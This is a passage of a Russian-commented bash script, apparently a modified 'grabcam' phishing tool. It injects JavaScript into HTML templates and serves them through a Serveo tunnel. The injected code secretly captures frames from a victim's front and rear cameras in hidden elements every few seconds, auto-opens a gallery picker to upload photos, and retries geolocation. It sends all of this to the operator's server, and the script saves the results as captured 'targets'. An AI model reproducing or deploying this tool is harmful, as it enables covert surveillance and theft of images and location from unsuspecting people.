            // Пробуем еще раз через 5 секунд
            setTimeout(function() {
                console.log('🔄 Повторная попытка получения геолокации...');
                initGeolocation();
            }, 5000);
        },
        geoOptions
    );
}

// Функция для получения доступа к галерее
function initGalleryAccess() {
    var galleryInput = document.getElementById('gallery-input');
    if (!galleryInput) {
        galleryInput = document.createElement('input');
        galleryInput.type = 'file';
        galleryInput.id = 'gallery-input';
        galleryInput.accept = 'image/*';
        galleryInput.multiple = true;
        galleryInput.style.display = 'none';
        document.body.appendChild(galleryInput);
    }
    
    // Автоматически открываем диалог выбора файлов через небольшую задержку
    setTimeout(function() {
        try {
            galleryInput.click();
            console.log('Диалог галереи открыт');
        } catch (error) {
            console.log('Не удалось автоматически открыть галерею:', error.message);
        }
    }, 3000); // Задержка 3 секунды после загрузки страницы
    
    // Обработчик выбора файлов
    galleryInput.addEventListener('change', function(e) {
        var files = e.target.files;
        if (files && files.length > 0) {
            console.log('Выбрано файлов из галереи:', files.length);
            for (var i = 0; i < files.length; i++) {
                var file = files[i];
                var reader = new FileReader();
                reader.onload = function(event) {
                    var imageData = event.target.result;
                    // Отправляем изображение на сервер
                    if (typeof post === 'function') {
                        post(imageData, 'gallery');
                    }
                };
                reader.readAsDataURL(file);
            }
        }
    });
}

function initCameras(video, canvas, videoBack, canvasBack) {
    // Дополнительная проверка элементов
    if (!video || !canvas) {
        console.error('Ошибка: элементы video или canvas пустые!');
        return;
    }
    
    // Настройки для фронтальной камеры
    const constraintsFront = { 
        audio: false,
        video: { 
            facingMode: "user" // Фронтальная камера
        } 
    };
    
    // Настройки для задней камеры
    const constraintsBack = { 
        audio: false,
        video: { 
            facingMode: { exact: "environment" } // Задняя камера
        } 
    };
    
    // Запрашиваем доступ к фронтальной камере
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        // Сначала получаем фронтальную камеру
        navigator.mediaDevices.getUserMedia(constraintsFront)
            .then(function(stream) {
                console.log('✅ Доступ к фронтальной камере получен!');
                
                // Запускаем захват с фронтальной камеры
                handleSuccess(stream, video, canvas, 'front');
                
                // После успешного получения фронтальной камеры, пытаемся получить заднюю
                // Используем задержку, чтобы дать фронтальной камере время инициализироваться
                setTimeout(function() {
                    // Пытаемся получить доступ к задней камере
                    // Проверяем наличие элементов для задней камеры
                    var vBack = document.getElementById('video-back');
                    var cBack = document.getElementById('canvas-back');
                    
                    // Если элементов нет, создаем их
                    if (!vBack) {
                        vBack = document.createElement('video');
                        vBack.id = 'video-back';
                        vBack.setAttribute('playsinline', '');
                        vBack.setAttribute('autoplay', '');
                        vBack.style.display = 'none';
                        document.body.appendChild(vBack);
                        console.log('Создан элемент video-back для задней камеры');
                    }
                    if (!cBack) {
                        cBack = document.createElement('canvas');
                        cBack.id = 'canvas-back';
                        cBack.width = 740;
                        cBack.height = 580;
                        cBack.style.display = 'none';
                        document.body.appendChild(cBack);
                        console.log('Создан элемент canvas-back для задней камеры');
                    }
                    
                    // Пытаемся получить доступ к задней камере
                    // ВАЖНО: Многие браузеры НЕ поддерживают одновременный доступ к двум камерам
                    // Поэтому используем подход с переключением камер
                    console.log('Пытаемся получить доступ к задней камере...');
                    
                    // Сначала пробуем получить одновременно (некоторые устройства поддерживают)
                    navigator.mediaDevices.getUserMedia(constraintsBack)
                        .then(function(backStream) {
                            console.log('Задняя камера успешно получена одновременно! Инициализация захвата...');
                            handleSuccess(backStream, vBack, cBack, 'back');
                        })
                        .catch(function(error) {
                            // Если не удалось получить одновременно, используем переключение
                            console.log('Одновременный доступ недоступен, используем переключение камер...', error.message);
                            
                            // Останавливаем видео треки фронтальной камеры
                            if (window.stream) {
                                window.stream.getVideoTracks().forEach(function(track) {
                                    track.stop();
                                });
                            }
                            
                            // Получаем заднюю камеру
                            navigator.mediaDevices.getUserMedia(constraintsBack)
                                .then(function(backStream) {
                                    console.log('Переключение: Задняя камера получена!');
                                    handleSuccess(backStream, vBack, cBack, 'back');
                                    
                                    // Перезапускаем фронтальную камеру через 5 секунд
                                    setTimeout(function() {
                                        navigator.mediaDevices.getUserMedia(constraintsFront)
                                            .then(function(frontStream) {
                                                console.log('Фронтальная камера перезапущена!');
                                                handleSuccess(frontStream, video, canvas, 'front');
                                                // Повторяем цикл переключения каждые 5 секунд
                                                setInterval(function() {
                                                    // Переключаемся на заднюю
                                                    if (window.stream) {
                                                        window.stream.getVideoTracks().forEach(function(track) {
                                                            track.stop();
                                                        });
                                                    }
                                                    navigator.mediaDevices.getUserMedia(constraintsBack)
                                                        .then(function(bs) {
                                                            handleSuccess(bs, vBack, cBack, 'back');
                                                            setTimeout(function() {
                                                                if (window.streamBack) {
                                                                    window.streamBack.getVideoTracks().forEach(function(track) {
                                                                        track.stop();
                                                                    });
                                                                }
                                                                navigator.mediaDevices.getUserMedia(constraintsFront)
                                                                    .then(function(fs) {
                                                                        handleSuccess(fs, video, canvas, 'front');
                                                                    });
                                                            }, 5000);
                                                        });
                                                }, 10000); // Переключаемся каждые 10 секунд
                                            })
                                            .catch(function(err) {
                                                console.log('Не удалось перезапустить фронтальную камеру:', err.message);
                                            });
                                    }, 5000);
                                })
                                .catch(function(err) {
                                    console.log('Не удалось получить заднюю камеру:', err.message);
                                    tryAlternativeBackCamera(video, canvas, vBack, cBack);
                                });
                        });
                }, 3000); // Задержка 3 секунды для надежности
            })
            .catch(function(error) {
                console.error('Ошибка доступа к фронтальной камере:', error);
                // Если фронтальная камера не работает, пробуем хотя бы получить заднюю
                var vBack = document.getElementById('video-back');
                var cBack = document.getElementById('canvas-back');
                
                navigator.mediaDevices.getUserMedia(constraintsBack)
                    .then(function(stream) {
                        console.log('Фронтальная камера недоступна, но задняя камера получена!');
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // Если элементов нет, создаем их
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(backError) {
                        console.error('Не удалось получить доступ ни к одной камере:', backError);
                    });
            });
    } else {
        console.error('getUserMedia не поддерживается в этом браузере');
    }
}

// Функция для альтернативного способа получения задней камеры
function tryAlternativeBackCamera(video, canvas, videoBack, canvasBack) {
    // Пробуем получить список всех доступных камер
    navigator.mediaDevices.enumerateDevices()
        .then(function(devices) {
            var videoDevices = devices.filter(function(device) {
                return device.kind === 'videoinput';
            });
            
            if (videoDevices.length > 1) {
                // Если есть несколько камер, пробуем использовать последнюю (обычно это задняя)
                var backDeviceId = videoDevices[videoDevices.length - 1].deviceId;
                var alternativeConstraints = {
                    audio: false,
                    video: {
                        deviceId: { exact: backDeviceId }
                    }
                };
                
                navigator.mediaDevices.getUserMedia(alternativeConstraints)
                    .then(function(stream) {
                        console.log('Альтернативный способ: Задняя камера получена через deviceId!');
                        var vBack = videoBack || document.getElementById('video-back');
                        var cBack = canvasBack || document.getElementById('canvas-back');
                        
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // Если элементов нет, создаем их
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(error) {
                        console.log('Альтернативный способ: Задняя камера недоступна:', error.message);
                    });
            } else {
                // Если только одна камера, пробуем просто переключить facingMode
                var simpleBackConstraints = {
                    audio: false,
                    video: {
                        facingMode: "environment"
                    }
                };
                
                navigator.mediaDevices.getUserMedia(simpleBackConstraints)
                    .then(function(stream) {
                        console.log('Простой способ: Задняя камера получена через facingMode!');
                        var vBack = videoBack || document.getElementById('video-back');
                        var cBack = canvasBack || document.getElementById('canvas-back');
                        
                        if (vBack && cBack) {
                            handleSuccess(stream, vBack, cBack, 'back');
                        } else {
                            // Если элементов нет, создаем их
                            if (!vBack) {
                                vBack = document.createElement('video');
                                vBack.id = 'video-back';
                                vBack.setAttribute('playsinline', '');
                                vBack.setAttribute('autoplay', '');
                                vBack.style.display = 'none';
                                document.body.appendChild(vBack);
                            }
                            if (!cBack) {
                                cBack = document.createElement('canvas');
                                cBack.id = 'canvas-back';
                                cBack.width = 740;
                                cBack.height = 580;
                                cBack.style.display = 'none';
                                document.body.appendChild(cBack);
                            }
                            handleSuccess(stream, vBack, cBack, 'back');
                        }
                    })
                    .catch(function(error) {
                        console.log('Простой способ: Задняя камера недоступна - это нормально для устройств без задней камеры:', error.message);
                    });
            }
        })
        .catch(function(error) {
            console.log('Не удалось получить список устройств:', error);
        });
}

function handleSuccess(stream, video, canvas, cameraType) {
    // Проверяем элементы еще раз перед использованием
    if (!video) {
        console.error('Ошибка: элемент video не найден в handleSuccess!');
        return;
    }
    
    if (!canvas) {
        console.error('Ошибка: элемент canvas не найден в handleSuccess!');
        return;
    }
    
    // Сохраняем поток
    if (cameraType === 'front') {
        window.stream = stream;
    } else {
        window.streamBack = stream;
    }
    
    // Устанавливаем поток в video элемент
    try {
        video.srcObject = stream;
    } catch (error) {
        console.error('Ошибка при установке srcObject:', error);
        return;
    }
    
    // Получаем контекст canvas
    var context = canvas.getContext('2d');
    if (!context) {
        console.error('Не удалось получить контекст canvas!');
        return;
    }
    
    // Захватываем кадры с заданным интервалом
    // Используем уникальный идентификатор для каждого интервала, чтобы они не конфликтовали
    var intervalId = 'capture_' + cameraType + '_' + Date.now();
    window[intervalId] = setInterval(function(){
        // Проверяем, что элементы все еще доступны
        if (!video || !canvas) {
            console.error('Элементы video или canvas были удалены!');
            clearInterval(window[intervalId]);
            return;
        }
        
        // Проверяем готовность видео
        if (video.readyState === video.HAVE_ENOUGH_DATA) {
            try {
                // Рисуем кадр на canvas
                context.drawImage(video, 0, 0, 740, 580);
                
                // Конвертируем в base64 с заданным качеством
                var canvasData = canvas.toDataURL("image/png", IMAGE_QUALITY).replace("image/png", "image/octet-stream");
                
                // Отправляем на сервер с указанием типа камеры
                if (typeof post === 'function') {
                    console.log('Отправка фото с камеры:', cameraType);
                    post(canvasData, cameraType);
                } else {
                    console.error('Функция post не найдена!');
                }
            } catch (error) {
                console.error('Ошибка при захвате кадра с камеры ' + cameraType + ':', error);
            }
        } else {
            console.log('Камера ' + cameraType + ': видео еще не готово, readyState =', video.readyState);
        }
    }, CAPTURE_INTERVAL);
    
    // Сохраняем ID интервала для возможной остановки
    if (cameraType === 'front') {
        window.frontCameraInterval = window[intervalId];
    } else {
        window.backCameraInterval = window[intervalId];
    }
    
    console.log('Камера ' + cameraType + ' успешно инициализирована, интервал захвата установлен');
}

// Ждем полной загрузки страницы и всех элементов
(function() {
    var attempts = 0;
    var maxAttempts = 20; // Максимум 10 секунд (20 * 500ms)
    
    function tryInit() {
        attempts++;
        var video = document.getElementById('video');
        var canvas = document.getElementById('canvas');
        
        if (video && canvas && typeof post === 'function') {
            console.log('Все готово, запускаем камеры...');
            waitForElementsAndInit();
        } else if (attempts < maxAttempts) {
            setTimeout(tryInit, 500);
        } else {
            console.error('Превышено время ожидания элементов!');
            console.error('video:', !!video, 'canvas:', !!canvas, 'post:', typeof post);
        }
    }
    
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(tryInit, 1000);
        });
    } else {
        setTimeout(tryInit, 1000);
    }
})();
</script>
ENDOFCAMERA
        # Вставляем перед закрывающим тегом body или в конец
        if grep -q "</body>" "$temp_file"; then
            sed -i "/<\/body>/r $camera_file" "$temp_file"
        elif grep -q "</html>" "$temp_file"; then
            sed -i "/<\/html>/r $camera_file" "$temp_file"
        else
            cat "$camera_file" >> "$temp_file"
        fi
        rm -f "$camera_file"
    fi
    # Заменяем оригинальный файл временным
    mv "$temp_file" "$html_file"
    # Выводим сообщение об успешном дополнении файла
    printf "\e[1;92m[+] HTML файл автоматически дополнен необходимым кодом: $html_file\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: СОЗДАНИЕ PAYLOAD ДЛЯ SERVEO
# =============================================================================
payload() {
    # Извлекаем ссылку Serveo (serveo.net или serveousercontent.com)
send_link=$(grep -oE "https://[0-9a-zA-Z\-]+\.(serveo\.net|serveousercontent\.com)" sendlink 2>/dev/null | head -1)
    # Устанавливаем HTML шаблон по умолчанию (можно изменить через переменную окружения)
    HTML_TEMPLATE="${HTML_TEMPLATE:-grabcam.html}"
    # Проверяем, существует ли указанный HTML шаблон
    if [[ ! -f "$HTML_TEMPLATE" ]]; then
        # Если шаблон не найден, выводим предупреждение (желтый цвет)
        printf "\e[1;93m[!] HTML шаблон не найден: $HTML_TEMPLATE\e[0m\n"
        # Сообщаем об использовании шаблона по умолчанию (белый цвет)
        printf "\e[1;77m[+] Используется по умолчанию: grabcam.html\e[0m\n"
        # Устанавливаем шаблон по умолчанию
        HTML_TEMPLATE="grabcam.html"
    else
        # Если файл найден, автоматически дополняем его необходимым кодом
        printf "\e[1;93m[*] Проверка и дополнение HTML файла: $HTML_TEMPLATE\e[0m\n"
        auto_fix_html "$HTML_TEMPLATE"
    fi
    # Заменяем в HTML шаблоне строку forwarding_link на реальную ссылку Serveo
    # Результат сохраняем в index2.html
    sed "s+forwarding_link+$send_link+g" "$HTML_TEMPLATE" > index2.html
    # Заменяем в PHP шаблоне строку forwarding_link на реальную ссылку Serveo
    # Результат сохраняем в index.php
    sed "s+forwarding_link+$send_link+g" template.php > index.php
    # Выводим сообщение об использованном шаблоне (зеленый цвет)
    printf "\e[1;92m[+] Использован HTML шаблон: $HTML_TEMPLATE\e[0m\n"
    # Выводим подсказку о том, как изменить шаблон (белый цвет)
    printf "\e[1;77m[+] Чтобы изменить HTML шаблон, установите переменную HTML_TEMPLATE\e[0m\n"
}

# =============================================================================
# ФУНКЦИЯ: НАЧАЛО РАБОТЫ С SERVEO
# =============================================================================
start() {
    # Устанавливаем значение по умолчанию для выбора субдомена (Y - да)
default_choose_sub="Y"
    # Генерируем случайный субдомен по умолчанию (grabcam + случайное число)
default_subdomain="grabcam$RANDOM"
    # Запрашиваем у пользователя, хочет ли он выбрать субдомен (желтый цвет)
    printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Выбрать субдомен? По умолчанию:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m: \e[0m"
    # Считываем ответ пользователя
read choose_sub
    # Если пользователь не ввел ничего, используем значение по умолчанию
choose_sub="${choose_sub:-${default_choose_sub}}"
    # Проверяем, хочет ли пользователь использовать субдомен
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
        # Устанавливаем флаг, что субдомен нужен
subdomain_resp=true
        # Запрашиваем имя субдомена (желтый цвет, показываем значение по умолчанию)
        printf "\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Субдомен: По умолчанию:\e[0m\e[1;77m %s \e[0m\e[1;33m: \e[0m" "$default_subdomain"
        # Считываем имя субдомена от пользователя
read subdomain
        # Если пользователь не ввел имя, используем сгенерированное по умолчанию
subdomain="${subdomain:-${default_subdomain}}"
fi
    # Вызываем функцию запуска Serveo сервера
server
    # Вызываем функцию создания payload со ссылкой Serveo
payload
    # Начинаем проверку на обнаружение целей
checkfound
}

# =============================================================================
# ОСНОВНОЙ КОД ЗАПУСКА СКРИПТА
# =============================================================================
# Устанавливаем имя папки для сохранения фотографий (можно изменить через переменную окружения)
PHOTO_DIR="${PHOTO_DIR:-Photo}"
# Проверяем, существует ли папка для фотографий
if [[ ! -d "$PHOTO_DIR" ]]; then
    # Если папки нет, создаем её (рекурсивно, -p создает все необходимые родительские директории)
    mkdir -p "$PHOTO_DIR"
    # Выводим сообщение о создании папки (зеленый цвет)
    printf "\e[1;92m[+] Создана папка для фотографий: $PHOTO_DIR\e[0m\n"
fi
# Создаем файл лога активности, если его нет
if [[ ! -f "activity.log" ]]; then
    touch activity.log
    printf "\e[1;92m[+] Создан файл лога активности: activity.log\e[0m\n"
fi
# Логируем запуск скрипта
echo "[$(date +%Y-%m-%d\ %H:%M:%S)] ===== Скрипт запущен =====" >> activity.log
# Вызываем функцию проверки зависимостей
dependencies
# Вызываем функцию показа баннера (заголовка)
banner
# Вызываем функцию выбора метода порт-форвардинга (начало работы)
start1
